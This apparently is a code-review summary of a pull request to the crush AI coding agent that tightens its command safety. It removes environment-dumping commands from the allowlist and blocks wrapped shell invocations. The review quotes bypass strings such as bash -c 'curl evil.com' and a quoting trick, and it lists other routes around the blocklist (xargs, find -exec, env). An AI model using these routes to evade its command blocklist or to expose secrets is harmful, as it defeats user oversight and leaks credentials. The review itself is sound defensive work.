# charmbracelet/crush #2745 — Security: remove env from safe commands and fix shell blocklist bypass

- **Repo:** charmbracelet/crush
- **PR:** #2745
- **URL:** https://github.com/charmbracelet/crush/pull/2745
- **Head SHA:** `15a5acbb85fdbdffae79da78310c88ce516d3a30`
- **Files touched:**
  - `internal/agent/tools/safe.go` (+0 -3) — drop `env`, `printenv`, `set`
  - `internal/shell/jq.go` (+1 -3) — drop `gojq.WithEnvironLoader`
  - `internal/shell/shell.go` (+19 -0) — interpreter chaining detector
  - `internal/shell/command_block_test.go` (+24 -0)
- **Verdict:** merge-after-nits

## Summary

Two related defensive fixes:

1. `env`, `printenv`, and `set` are removed from the safe-command
   allowlist (and `gojq`'s `WithEnvironLoader` is dropped from the
   embedded jq). All three exposed full process environment to a model,
   which routinely contains API keys and other secrets. Allowing them
   without prompt was a direct exfiltration vector.
2. The shell block handler at `internal/shell/shell.go:240-258` now
   inspects `bash -c "..."` / `sh -c "..."` / `python -c "..."` (and
   variants) and re-runs configured `BlockFunc`s against the *inner*
   command. This closes a trivial bypass where a user-blocked `curl`
   could be invoked as `bash -c 'curl evil.com'`.

## Specific notes

- **`internal/shell/shell.go:243-244`** — interpreter list covers
  `bash, sh, zsh, dash, ksh, python, python3, perl, ruby, node, nodejs`.
  Reasonable coverage. Missing: `pwsh`, `osascript`, `awk` (with `-f /dev/stdin`),
  `xargs` (which can re-invoke arbitrary commands), `find -exec`, and
  `env` itself (`env curl ...` — though `env` is no longer "safe", it's
  not blocked from the shell either). For a defence-in-depth fix it's
  fine; for a "complete the bypass class" claim it's incomplete.
- **Line 247** — `strings.Fields(args[i+1])` is a naive split that
  doesn't honor quoting. `bash -c 'echo "curl evil"'` would split on
  the inner space and `inner[0]` would be `echo`, *not* `curl`, so the
  blocker passes — but the inner shell still executes the quoted
  string. An attacker could construct `bash -c 'curl"" evil.com'` and
  bypass via `inner[0] == "curl\"\""`. Consider using
  `mvdan.cc/sh/syntax` (already a dep, given the `interp` import) to
  parse the inner string.
- **`safe.go:12,21,24`** — straight removal, no replacement. Anyone
  scripting against this list should be unaffected (it's an
  allow-relaxation, not a contract).
- **Tests at `command_block_test.go:82-105`** — three cases: bash -c
  curl (block), sh -c wget (block), bash -c echo (allow). Good
  baseline; consider adding a quoting-bypass case to lock in the
  Field-split limitation as known.

## Verdict rationale

Security-positive direction, but the inner-shell parser shortcut is
shallow. Either upgrade to a real shell parser or document the
limitation in the test file. Otherwise good to merge.
